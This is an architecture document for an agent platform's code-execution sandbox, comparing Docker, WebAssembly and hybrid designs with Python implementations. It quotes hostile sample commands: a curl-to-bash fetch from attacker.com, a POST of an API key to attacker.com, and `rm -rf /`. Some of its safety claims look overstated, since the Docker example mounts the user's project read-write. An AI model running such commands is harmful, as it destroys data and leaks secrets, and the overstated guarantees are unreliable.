# Code Execution Sandbox Architecture

## Executive Summary

The sandbox is the **CRITICAL SAFETY COMPONENT** that prevents malicious or buggy generated code from destroying the user's system. Without it, a single syntax error in generated code could delete the entire user filesystem (`rm -rf /`).

CODITECT has **three sandbox options** ranging from lightweight (WebAssembly) to robust (Docker), with a recommended hybrid approach.

---

## Part 1: Why Sandboxing is Critical

### The Problem

When an autonomous agent generates and executes code, two types of errors can occur:

1. **Malicious Code** (intentional):
   - `os.system("curl http://attacker.com/steal.sh | bash")`
   - Exfiltrating API keys or source code
   - Cryptomining

2. **Buggy Code** (accidental):
   - Infinite loops that consume 100% CPU
   - Recursive directory operations that write terabytes of logs
   - Memory leaks that consume all RAM
   - `os.remove("/home")` from a logic error

### Without Sandboxing

Generated code runs with full privileges of the user:
```bash
Agent generates:   rm -rf /    # Meant to clean temp dir
Result:            User's entire filesystem deleted
User Response:     "Uninstall this immediately"
```

### With Sandboxing

Generated code runs in isolation:
```bash
Agent generates:   rm -rf /    # Meant to clean temp dir
Sandbox sees:      /app (not /)  # Restricted virtual filesystem
Result:            Only sandbox temp dir deleted (recovered on restart)
User Response:     "Wow, it self-recovered from an error!"
```

---

## Part 2: Three Sandbox Options

### Option 1: Docker Sandbox (RECOMMENDED FOR NOW)

**Best For:** Development, users with Docker installed

**Pros:**
- OS-level kernel isolation (very secure)
- Can run any Python package (numpy, torch, pandas, etc.)
- Can limit CPU/RAM per container
- Network isolation possible
- Well-understood by developers

**Cons:**
- Requires Docker Desktop (heavy, ~2GB RAM)
- Slow startup time (~500ms - 2000ms per execution)
- Not suitable for 1000+ sandboxes per second

**Implementation:**

```python
import docker
from docker.errors import ContainerError, ImageNotFound
import os
import tempfile
import json

class DockerSandbox:
    def __init__(self, image="python:3.11-slim"):
        """Initialize Docker sandbox."""
        self.client = docker.from_env()
        self.image = image
        self._ensure_image_exists()

    def _ensure_image_exists(self):
        """Pull image if not already available."""
        try:
            self.client.images.get(self.image)
        except ImageNotFound:
            print(f"Pulling {self.image}...")
            self.client.images.pull(self.image)

    def execute_code(self, code_string: str, project_path: str, timeout: int = 30) -> dict:
        """
        Execute code in a Docker container.

        Args:
            code_string: Python code to execute
            project_path: Project directory to mount (read-write)
            timeout: Max seconds to run (default 30s)

        Returns:
            {
                "status": "success" | "error" | "timeout" | "system_failure",
                "stdout": str,
                "stderr": str,
                "exit_code": int,
                "execution_time_ms": int
            }
        """
        import time
        start_time = time.time()

        # Write code to temp file
        temp_filename = "__agent_exec_temp.py"
        host_file_path = os.path.join(project_path, temp_filename)

        try:
            # Write code to project directory (so container can access it)
            with open(host_file_path, "w") as f:
                f.write(code_string)

            # Run in container
            result = self.client.containers.run(
                image=self.image,
                command=f"python /app/{temp_filename}",
                volumes={
                    os.path.abspath(project_path): {'bind': '/app', 'mode': 'rw'}
                },
                working_dir="/app",
                network_mode="none",          # No internet access
                mem_limit="512m",             # Max 512MB RAM
                memswap_limit="512m",         # No swap
                cpus=1.0,                     # Max 1 CPU
                remove=True,                  # Delete container after run
                timeout=timeout,
                stderr=True,
                stdout=True,
            )

            execution_time = int((time.time() - start_time) * 1000)

            return {
                "status": "success",
                "stdout": result.decode("utf-8") if isinstance(result, bytes) else result,
                "stderr": "",
                "exit_code": 0,
                "execution_time_ms": execution_time
            }

        except docker.errors.ContainerError as e:
            # Code ran but exited with non-zero code
            execution_time = int((time.time() - start_time) * 1000)
            return {
                "status": "error",
                "stdout": e.stdout.decode("utf-8") if e.stdout else "",
                "stderr": e.stderr.decode("utf-8") if e.stderr else "",
                "exit_code": e.exit_status,
                "execution_time_ms": execution_time
            }

        except docker.errors.APIError as e:
            # Timeout or other Docker error
            execution_time = int((time.time() - start_time) * 1000)
            if "Timeout" in str(e):
                return {
                    "status": "timeout",
                    "stdout": "",
                    "stderr": f"Execution exceeded {timeout}s timeout",
                    "exit_code": 124,
                    "execution_time_ms": execution_time
                }
            else:
                return {
                    "status": "system_failure",
                    "stdout": "",
                    "stderr": str(e),
                    "exit_code": -1,
                    "execution_time_ms": execution_time
                }

        except Exception as e:
            # Unexpected error
            execution_time = int((time.time() - start_time) * 1000)
            return {
                "status": "system_failure",
                "stdout": "",
                "stderr": str(e),
                "exit_code": -1,
                "execution_time_ms": execution_time
            }

        finally:
            # Clean up temp file
            if os.path.exists(host_file_path):
                os.remove(host_file_path)


# Usage Example
if __name__ == "__main__":
    sandbox = DockerSandbox()

    # Example 1: Normal code
    result = sandbox.execute_code(
        'print("Hello from sandbox!")',
        "./my_project"
    )
    print(f"Status: {result['status']}")
    print(f"Output: {result['stdout']}")

    # Example 2: Malicious code (safely contained)
    result = sandbox.execute_code(
        'import os; os.system("rm -rf /")',  # Only deletes /app, not /
        "./my_project"
    )
    print(f"Status: {result['status']}")

    # Example 3: Infinite loop (times out)
    result = sandbox.execute_code(
        'while True: pass',
        "./my_project",
        timeout=5
    )
    print(f"Status: {result['status']}")  # "timeout"
```

---

### Option 2: WebAssembly Sandbox (RECOMMENDED FOR SCALE)

**Best For:** Lightweight, fast execution, no Docker dependency

**Pros:**
- Tiny startup time (~5-20ms per execution)
- Mathematical isolation (memory-safe by design)
- Precise fuel/instruction limits
- No Docker dependency (just `pip install wasmtime`)
- Can execute 1000+ sandboxes per second

**Cons:**
- Pure Python only (no numpy, torch, pandas)
- Still emerging technology
- Smaller Python stdlib subset

**Implementation:**

```python
from wasmtime import Config, Engine, Linker, Module, Store, WasiConfig
import os
import tempfile
import io
import sys
import time

class WasmSandbox:
    def __init__(self, wasm_binary_path="tools/python-3.12.0.wasm"):
        """
        Initialize WebAssembly sandbox.

        Download binary from:
        https://github.com/vmware-labs/webassembly-language-runtimes/releases/download/python%2F3.12.0%2B20231211-f03324d/python-3.12.0.wasm
        """
        # Configure the runtime
        engine_cfg = Config()
        engine_cfg.consume_fuel = True      # Enable instruction counting
        engine_cfg.cache = True             # Cache JIT compilation
        engine_cfg.wasm_simd = True         # Enable SIMD for performance

        self.engine = Engine(engine_cfg)
        self.linker = Linker(self.engine)
        self.linker.define_wasi()           # Link WASI (filesystem, I/O)

        # Load Python interpreter binary once (high performance)
        if not os.path.exists(wasm_binary_path):
            raise FileNotFoundError(
                f"WebAssembly binary not found at {wasm_binary_path}\n"
                "Download from: https://github.com/vmware-labs/webassembly-language-runtimes/"
            )

        self.module = Module.from_file(self.engine, wasm_binary_path)

    def execute_code(self, code_string: str, project_mount_path: str = None) -> dict:
        """
        Execute code in WebAssembly sandbox.

        Args:
            code_string: Python code to execute
            project_mount_path: Project directory to mount (read-write)

        Returns:
            {
                "status": "success" | "error" | "fuel_exhausted",
                "stdout": str,
                "stderr": str,
                "fuel_consumed": int,
                "execution_time_ms": int
            }
        """
        start_time = time.time()
        store = Store(self.engine)

        # Set fuel limit (~400M instructions = ~1 second of compute)
        # If code loops forever, fuel runs out and execution stops
        FUEL_LIMIT = 400_000_000
        store.set_fuel(FUEL_LIMIT)

        # Configure WASI (filesystem, I/O)
        wasi = WasiConfig()

        # Pass code as command-line argument
        wasi.argv = ["python", "-c", code_string]

        # Capture stdout/stderr
        with tempfile.TemporaryFile(mode='w+b') as stdout_temp, \
             tempfile.TemporaryFile(mode='w+b') as stderr_temp:

            # Mount project directory if provided
            # The guest sees it as /mnt/project
            if project_mount_path:
                abs_path = os.path.abspath(project_mount_path)
                wasi.preopen_dir(abs_path, "/mnt/project")

            wasi.stdout_file = stdout_temp
            wasi.stderr_file = stderr_temp
            store.set_wasi(wasi)

            try:
                # Instantiate and run
                instance = self.linker.instantiate(store, self.module)
                start_func = instance.exports(store)["_start"]
                start_func(store)

                status = "success"

            except Exception as e:
                # Catches "Out of Fuel" (infinite loops) and other errors
                error_str = str(e)
                if "out of fuel" in error_str.lower():
                    status = "fuel_exhausted"
                else:
                    status = "error"

            # Read captured output
            stdout_temp.seek(0)
            stderr_temp.seek(0)
            stdout = stdout_temp.read().decode("utf-8", errors="replace")
            stderr = stderr_temp.read().decode("utf-8", errors="replace")

            fuel_consumed = FUEL_LIMIT - store.fuel_remaining()
            execution_time = int((time.time() - start_time) * 1000)

            return {
                "status": status,
                "stdout": stdout,
                "stderr": stderr,
                "fuel_consumed": fuel_consumed,
                "execution_time_ms": execution_time
            }


# Usage Example
if __name__ == "__main__":
    sandbox = WasmSandbox("tools/python-3.12.0.wasm")

    # Example 1: Normal code
    result = sandbox.execute_code(
        'print("Hello from WebAssembly!")'
    )
    print(f"Status: {result['status']}")
    print(f"Output: {result['stdout']}")
    print(f"Fuel used: {result['fuel_consumed']}")

    # Example 2: Infinite loop (safely stopped)
    result = sandbox.execute_code(
        'while True: pass'
    )
    print(f"Status: {result['status']}")  # "fuel_exhausted"

    # Example 3: File I/O (sandboxed)
    result = sandbox.execute_code(
        'with open("/mnt/project/test.txt", "w") as f: f.write("Hello")',
        project_mount_path="./my_project"
    )
    print(f"Status: {result['status']}")  # "success"
```

---

### Option 3: Hybrid Approach (RECOMMENDED)

Use **WebAssembly for 90% of cases** (pure Python scripts), fall back to **Docker for heavy libraries**:

```python
class HybridSandbox:
    def __init__(self, wasm_binary_path="tools/python-3.12.0.wasm"):
        self.wasm_sandbox = WasmSandbox(wasm_binary_path)
        self.docker_sandbox = DockerSandbox()

    def execute_code(self, code_string: str, project_path: str, require_libraries=False) -> dict:
        """
        Execute code, choosing sandbox type automatically.

        Args:
            code_string: Python code
            project_path: Project directory
            require_libraries: If True, use Docker (for numpy, torch, etc.)
        """
        if require_libraries or self._needs_heavy_libraries(code_string):
            # Use Docker for code that imports numpy, torch, pandas, etc.
            return self.docker_sandbox.execute_code(code_string, project_path)
        else:
            # Use WebAssembly (5-20ms startup vs 500ms+ for Docker)
            return self.wasm_sandbox.execute_code(code_string, project_path)

    def _needs_heavy_libraries(self, code_string: str) -> bool:
        """Heuristic: check if code imports heavy libraries."""
        heavy_libs = ["numpy", "torch", "tensorflow", "pandas", "scipy", "sklearn"]
        for lib in heavy_libs:
            if f"import {lib}" in code_string or f"from {lib}" in code_string:
                return True
        return False
```

---

## Part 3: Integration with CODITECT Layers

### Layer 3: Worker Agents Execution Flow

```
┌─────────────────────────────────────────┐
│ Agent receives task: "Generate code"    │
└────────────────┬────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────┐
│ LLM generates Python code                │
│ (e.g., "import os; os.mkdir('/tmp/x')")│
└────────────────┬────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────┐
│ Agent calls: HybridSandbox.execute_code()│
│   - Code string                          │
│   - Project path                         │
│   - require_libraries flag              │
└────────────────┬────────────────────────┘
                 │
        ┌────────┴────────┐
        │                 │
        ▼                 ▼
   WebAssembly        Docker
   (5-20ms)         (500ms+)
   Pure Python       Any libs
        │                 │
        └────────┬────────┘
                 │
                 ▼
┌─────────────────────────────────────────┐
│ Result returned:                        │
│ {                                       │
│   "status": "success",                  │
│   "stdout": "output...",                │
│   "stderr": "",                         │
│   "execution_time_ms": 12               │
│ }                                       │
└────────────────┬────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────┐
│ Agent evaluates result                  │
│ - Did it work?                          │
│ - Any errors?                           │
│ - Update world model                    │
└────────────────┬────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────┐
│ Write result to SQLite (local cache)    │
│ Write to NATS event stream              │
│ Syncer pushes to FoundationDB (cloud)   │
└─────────────────────────────────────────┘
```

---

## Part 4: Safety Guarantees

### What Each Sandbox Prevents

| Attack Type | Docker | WebAssembly | Guarantee |
|-----------|--------|-------------|-----------|
| Filesystem deletion | ✅ | ✅ | Only /app or /mnt/project |
| Network exfiltration | ✅ | ✅ | No internet access by default |
| Infinite loops | ⚠️ Timeout | ✅ Fuel | Fuel expires after ~1 sec |
| Memory explosion | ✅ Cgroup limit | ✅ Memory limit | Max 512MB |
| CPU DoS | ✅ CPU limit | ⚠️ Process-wide | Limited to 1 CPU (Docker) |
| Access parent files | ✅ | ✅ | Sandbox isolation |

### Failure Modes

**Case 1: Agent generates infinite loop**
```python
# Generated code:
while True: pass

# Docker: Timeout after 30s
# WebAssembly: Fuel exhausted after ~400M instructions
# Result: {"status": "timeout" or "fuel_exhausted"}
```

**Case 2: Agent generates large allocation**
```python
# Generated code:
x = [0] * (10 ** 9)  # Try to allocate 10GB

# Docker: OOMKilled (512MB limit)
# WebAssembly: Memory limit exceeded
# Result: Agent sees OOM error, can debug and retry
```

**Case 3: Agent tries to exfiltrate data**
```python
# Generated code:
import requests
requests.post("https://attacker.com", data=api_key)

# Docker: network_mode="none" - request fails
# WebAssembly: No network access - request fails
# Result: {"status": "error", "stderr": "urlopen error Network unreachable"}
```

---

## Part 5: Configuration & Deployment

### Development Setup

```bash
# Option 1: Docker (if you have Docker installed)
docker pull python:3.11-slim
# CODITECT automatically uses DockerSandbox

# Option 2: WebAssembly (lightweight, no Docker)
pip install wasmtime
wget https://github.com/vmware-labs/webassembly-language-runtimes/releases/download/python%2F3.12.0%2B20231211-f03324d/python-3.12.0.wasm
mkdir -p tools/
mv python-3.12.0.wasm tools/
# CODITECT automatically uses WasmSandbox
```

### Production Deployment

**In Kubernetes:**
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: coditect-agent
spec:
  containers:
  - name: agent
    image: coditect/agent:latest
    securityContext:
      runAsNonRoot: true
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
    resources:
      limits:
        memory: "1Gi"
        cpu: "2"
```

---

## Part 6: Monitoring & Observability

### Metrics to Track

```python
{
    "sandbox_executions_total": Counter,          # Total executions
    "sandbox_execution_duration_ms": Histogram,   # Latency
    "sandbox_fuel_consumed": Histogram,           # (WebAssembly only)
    "sandbox_timeouts_total": Counter,            # Timeout count
    "sandbox_oom_failures_total": Counter,        # OOM count
    "sandbox_success_rate": Gauge,                # % successful
}
```

### Health Checks

```python
def check_sandbox_health() -> bool:
    """Verify sandbox is operational."""
    try:
        # Test basic execution
        result = sandbox.execute_code('print("OK")')
        return result["status"] == "success"
    except Exception as e:
        logger.error(f"Sandbox health check failed: {e}")
        return False
```

---

## Conclusion

The **hybrid sandbox approach** is recommended:

1. **WebAssembly (default)** - Fast (5-20ms), safe by design, low overhead
2. **Docker (fallback)** - Universal (any library), but slower (500ms+)
3. **Graceful degradation** - If Docker unavailable, warn user but continue with WASM

This protects users from accidents while maintaining performance and compatibility.

---

## References

- Wasmtime: https://docs.wasmtime.dev/
- Docker Python SDK: https://docker-py.readthedocs.io/
- Python Wasm Binary: https://github.com/vmware-labs/webassembly-language-runtimes
- WASI Specification: https://wasi.dev/
